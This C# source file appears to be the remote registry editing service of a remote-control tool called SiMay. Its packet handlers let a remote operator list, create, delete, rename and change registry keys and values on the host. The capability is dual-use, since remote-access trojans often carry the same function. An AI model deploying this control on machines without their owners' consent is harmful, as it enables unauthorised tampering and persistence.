using SiMay.Core;
using SiMay.ModelBinder;
using SiMay.Net.SessionProvider;
using SiMay.Platform.Windows;
using SiMay.ServiceCore.Attributes;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;

namespace SiMay.ServiceCore
{
    [ServiceName("远程注册表")]
    [ServiceKey(AppFlageConstant.REMOTE_REGEDIT)]
    public class RegistryEditorService : ApplicationRemoteService
    {
        public override void SessionInited(SessionProviderContext session)
        {

        }

        public override void SessionClosed()
        {

        }

        [PacketHandler(MessageHead.S_NREG_LOAD_REGKEYS)]
        public void HandleGetRegistryKey(SessionProviderContext session)
        {
            DoLoadRegistryKeyPack packet = session.GetMessageEntity<DoLoadRegistryKeyPack>();
            GetRegistryKeysResponsePack responsePacket = new GetRegistryKeysResponsePack();
            try
            {
                RegistrySeeker seeker = new RegistrySeeker();
                seeker.BeginSeeking(packet.RootKeyName);

                responsePacket.Matches = seeker.Matches;
                responsePacket.IsError = false;
            }
            catch (Exception e)
            {
                responsePacket.IsError = true;
                responsePacket.ErrorMsg = e.Message;
            }
            responsePacket.RootKey = packet.RootKeyName;
            CurrentSession.SendTo(MessageHead.C_NREG_LOAD_REGKEYS, responsePacket);
        }

        #region Registry Key Edit

        [PacketHandler(MessageHead.S_NREG_CREATE_KEY)]
        public void HandleCreateRegistryKey(SessionProviderContext session)
        {
            var packet = session.GetMessageEntity<DoCreateRegistryKeyPack>();
            GetCreateRegistryKeyResponsePack responsePacket = new GetCreateRegistryKeyResponsePack();
            string errorMsg;
            string newKeyName = "";

            try
            {
                responsePacket.IsError = !(RegistryEditor.CreateRegistryKey(packet.ParentPath, out newKeyName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }

            responsePacket.ErrorMsg = errorMsg;
            responsePacket.Match = new RegSeekerMatch
            {
                Key = newKeyName,
                Data = RegistryKeyHelper.GetDefaultValues(),
                HasSubKeys = false
            };
            responsePacket.ParentPath = packet.ParentPath;

            CurrentSession.SendTo(MessageHead.C_NREG_CREATE_KEY_RESPONSE, responsePacket);
            //client.Send(responsePacket);
        }

        [PacketHandler(MessageHead.S_NREG_DELETE_KEY)]
        public void HandleDeleteRegistryKey(SessionProviderContext session)
        {
            DoDeleteRegistryKeyPack packet = session.GetMessageEntity<DoDeleteRegistryKeyPack>();
            GetDeleteRegistryKeyResponsePack responsePacket = new GetDeleteRegistryKeyResponsePack();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.DeleteRegistryKey(packet.KeyName, packet.ParentPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ParentPath = packet.ParentPath;
            responsePacket.KeyName = packet.KeyName;

            CurrentSession.SendTo(MessageHead.C_NREG_DELETE_KEY_RESPONSE, responsePacket);
            //client.Send(responsePacket);
        }

        [PacketHandler(MessageHead.S_NREG_RENAME_KEY)]
        public void HandleRenameRegistryKey(SessionProviderContext session)
        {
            DoRenameRegistryKeyPack packet = session.GetMessageEntity<DoRenameRegistryKeyPack>();
            GetRenameRegistryKeyResponsePack responsePacket = new GetRenameRegistryKeyResponsePack();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.RenameRegistryKey(packet.OldKeyName, packet.NewKeyName, packet.ParentPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ParentPath = packet.ParentPath;
            responsePacket.OldKeyName = packet.OldKeyName;
            responsePacket.NewKeyName = packet.NewKeyName;

            CurrentSession.SendTo(MessageHead.C_NREG_RENAME_KEY_RESPONSE, responsePacket);
            //client.Send(responsePacket);
        }

        #endregion

        #region RegistryValue Edit

        [PacketHandler(MessageHead.S_NREG_CREATE_VALUE)]
        public void HandleCreateRegistryValue(SessionProviderContext session)
        {
            DoCreateRegistryValuePack packet = session.GetMessageEntity<DoCreateRegistryValuePack>();
            GetCreateRegistryValueResponsePack responsePacket = new GetCreateRegistryValueResponsePack();
            string errorMsg;
            string newKeyName = "";
            try
            {
                responsePacket.IsError = !(RegistryEditor.CreateRegistryValue(packet.KeyPath, packet.Kind, out newKeyName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.Value = RegistryKeyHelper.CreateRegValueData(newKeyName, packet.Kind, packet.Kind.GetDefault());
            responsePacket.KeyPath = packet.KeyPath;

            CurrentSession.SendTo(MessageHead.C_NREG_CREATE_VALUE_RESPONSE, responsePacket);
            //client.Send(responsePacket);
        }

        [PacketHandler(MessageHead.S_NREG_DELETE_VALUE)]
        public void HandleDeleteRegistryValue(SessionProviderContext session)
        {
            DoDeleteRegistryValuePack packet = session.GetMessageEntity<DoDeleteRegistryValuePack>();
            GetDeleteRegistryValueResponsePack responsePacket = new GetDeleteRegistryValueResponsePack();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.DeleteRegistryValue(packet.KeyPath, packet.ValueName, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.ValueName = packet.ValueName;
            responsePacket.KeyPath = packet.KeyPath;

            CurrentSession.SendTo(MessageHead.C_NREG_DELETE_VALUE_RESPONSE, responsePacket);
            //client.Send(responsePacket);
        }

        [PacketHandler(MessageHead.S_NREG_RENAME_VALUE)]
        public void HandleRenameRegistryValue(SessionProviderContext session)
        {
            DoRenameRegistryValuePack packet = session.GetMessageEntity<DoRenameRegistryValuePack>();
            GetRenameRegistryValueResponsePack responsePacket = new GetRenameRegistryValueResponsePack();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.RenameRegistryValue(packet.OldValueName, packet.NewValueName, packet.KeyPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.KeyPath = packet.KeyPath;
            responsePacket.OldValueName = packet.OldValueName;
            responsePacket.NewValueName = packet.NewValueName;

            CurrentSession.SendTo(MessageHead.C_NREG_RENAME_VALUE_RESPONSE, responsePacket);
            //client.Send(responsePacket);
        }

        [PacketHandler(MessageHead.S_NREG_CHANGE_VALUE)]
        public void HandleChangeRegistryValue(SessionProviderContext session)
        {
            DoChangeRegistryValuePack packet = session.GetMessageEntity<DoChangeRegistryValuePack>();
            GetChangeRegistryValueResponsePack responsePacket = new GetChangeRegistryValueResponsePack();
            string errorMsg;
            try
            {
                responsePacket.IsError = !(RegistryEditor.ChangeRegistryValue(packet.Value, packet.KeyPath, out errorMsg));
            }
            catch (Exception ex)
            {
                responsePacket.IsError = true;
                errorMsg = ex.Message;
            }
            responsePacket.ErrorMsg = errorMsg;
            responsePacket.KeyPath = packet.KeyPath;
            responsePacket.Value = packet.Value;

            CurrentSession.SendTo(MessageHead.C_NREG_CHANGE_VALUE_RESPONSE, responsePacket);
            //client.Send(responsePacket);
        }

        #endregion
    }
}
